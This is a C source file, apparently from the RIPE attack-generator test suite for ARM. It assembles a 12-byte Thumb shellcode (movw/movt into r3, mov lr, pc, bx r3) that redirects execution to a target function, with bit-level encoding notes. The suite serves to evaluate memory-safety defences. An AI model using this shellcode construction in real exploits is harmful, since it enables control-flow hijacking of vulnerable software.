#include <stddef.h>
#include <stdint.h>
#include <inttypes.h>
#include "ripe_attack_generator.h"

/* For ARM the shellcode consists of 4 instructions of 12B in total:
 * 32b: movw r3, lower bits(target)
 * 32b: movt r3, upper bits(target)
 * 16b: mov lr, pc
 * 16b: bx r3
*/
void
build_shellcode(uint8_t **shellcode, size_t *size_shellcode, func_t *target)
{
  *size_shellcode = 12;
  *shellcode = malloc(*size_shellcode);

  uint16_t target_high_raw = ((uint32_t)target) >> 16;
  uint16_t target_low_raw = ((uint32_t)target) & 0xFFFF;
  target_low_raw |= 1; // Set 0th bit to stay in Thumb mode on b*x

  /* NB: These are 2x16b instructions, and thus the first part must be stored in the lower 16 bits.
   *
   * MOVW:
   * 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0|15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0
   *  1  1  1  1  0  i  1  0 *0* 1  0  0|<- imm4  ->| 0|<-imm3->|<-   Rd  ->|<-       imm8        ->|

   * MOVT:
   * 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0|15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0
   *  1  1  1  1  0  i  1  0 *1* 1  0  0|<- imm4  ->| 0|<-imm3->|<-   Rd  ->|<-       imm8        ->|
   *
   * Respective intermediate: imm16 = imm4:i:imm3:imm8;
   * 15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0
   * |<- imm4 ->| i|<-imm3->|<-       imm8        ->|
   */
  uint32_t movw = (0b1111001001000000 | (3<<24)); // Prepare movw r3
  uint32_t movt = (0b1111001011000000 | (3<<24)); // Prepare movt r3
  #define MOV_IMM_BITS(x) (((x&0xF000)>>(12))|((x&0x800)>>(1))|((x&0x700)<<(12-8+16))|(x&0xFF)<<(16))
  movw |= MOV_IMM_BITS(target_low_raw);
  movt |= MOV_IMM_BITS(target_high_raw);

  uint16_t link = 0x46fe; // mov lr, pc
  uint16_t jump = 0x4718; // bx r3
  *(uint32_t *)(*shellcode +  0) = movw;
  *(uint32_t *)(*shellcode +  4) = movt;
  *(uint16_t *)(*shellcode +  8) = link;
  *(uint16_t *)(*shellcode + 10) = jump;

  dbg("----------------\n");
  dbg("Shellcode instructions:\n");
  dbg("%08"PRIx32"  movw r3, 0x%04"PRIx16"\n", movw, target_low_raw);
  dbg("%08"PRIx32"  movt r3, 0x%04"PRIx16"\n", movt, target_high_raw);
  dbg("    %04x  mov  lr, pc\n", link);
  dbg("    %04x  bx   r3\n", jump);
  dbg("----------------\n");
}

size_t prologue_length (void) {
  /* Typical prologue consists of:
   *  - pushing callee-saved regs (R7/FP and LR)
   *  - creating space on the stack
   *  - adjusting R7/FP
   * with 16 bits each.
   */
  return 6;
}
